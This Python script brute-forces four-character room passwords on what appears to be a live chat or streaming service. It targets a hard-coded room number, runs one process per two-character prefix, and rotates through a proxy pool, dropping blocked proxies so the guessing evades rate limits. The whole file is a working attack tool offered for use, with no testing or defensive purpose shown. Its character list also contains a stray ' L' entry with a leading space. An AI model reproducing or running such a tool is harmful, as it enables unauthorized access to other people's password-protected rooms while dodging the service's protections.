import random
import time
from ctypes import c_bool
from multiprocessing import Value, Array, Process

from Util import checkpassword, getroomid, getproxies

elements = [
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
    'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', ' L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
    'W', 'X', 'Y', 'Z'
]


def checkpass(status, proxies, proxy_state, roomid, x, y):
    for p in elements:
        for q in elements:
            if not status.value:
                password = elements[x] + elements[y] + p + q
                list = []
                for i in range(len(proxy_state)):
                    if proxy_state[i] == 1:
                        list.append(i)
                print('available proxy has ' + str(len(list)) + ' left')
                if len(list) == 0:
                    return None
                randomproxy = proxies[random.choice(list)]
                print(str(proxy_state[proxies.index(randomproxy)]) + '-----------' + randomproxy)
                response = checkpassword(roomid, password, randomproxy)
                if response is None:
                    proxy_state[proxies.index(randomproxy)] = 0
                    print('the password ' + password + ' can not be handled.')
                elif '"message": "success"' in response.text:
                    print(response.text)
                    print('success' in response.text)
                    status.value = True
                    return password
            else:
                return None


def process(status, proxies, proxy_state, roomid, x, y):
    password = checkpass(status, proxies, proxy_state, roomid, x, y)
    if password is not None:
        print('the answer is in ' + elements[x] + elements[y] + '??' + '. And the room password is ' + password)
    else:
        print('the answer is not in ' + elements[x] + elements[y] + '??')


if __name__ == '__main__':
    start = time.time()
    proxies = getproxies()
    status = Value(c_bool, False)
    proxy_state = Array('i', [1] * len(proxies))

    roomid = None
    if not roomid:
        roomid = getroomid(userid=None, roomnum='1271280')

    p_list = []

    for x, y in ((p, q) for p in range(len(elements)) for q in range(len(elements))):
        p = Process(target=process,
                    args=(status, proxies, proxy_state, roomid, x, y))
        p.start()
        p_list.append(p)

    for p in p_list:
        p.join()

    end = time.time()

    print(end - start)
